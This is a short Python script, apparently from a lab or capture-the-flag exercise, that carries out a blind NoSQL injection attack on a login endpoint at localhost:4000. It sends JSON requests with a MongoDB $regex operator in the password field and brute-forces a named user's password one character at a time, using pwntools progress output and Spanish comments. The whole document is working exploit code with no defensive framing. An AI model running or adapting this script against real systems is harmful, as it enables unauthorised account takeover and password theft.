#!/usr/bin/python3

import time, requests, signal, string, sys
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)


# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://localhost:4000/user/login"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def makeNoSQLI():
    password = ""
    header = {'Content-Type': 'application/json'}

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(1.5)
    p2 = log.progress("Password")

    for position in range(1, 25):
        for character in characters:
            post_data = '{"username":"angryPrism58736","password":{"$regex":"^%s%s"}}' % (password,character)

            p1.status(post_data)

            r = requests.post(login_url, data=post_data, headers=header)
            if "Logged in as user" in r.text:
                password += character
                p2.status(password)
                break

if __name__ == "__main__":

    makeNoSQLI()
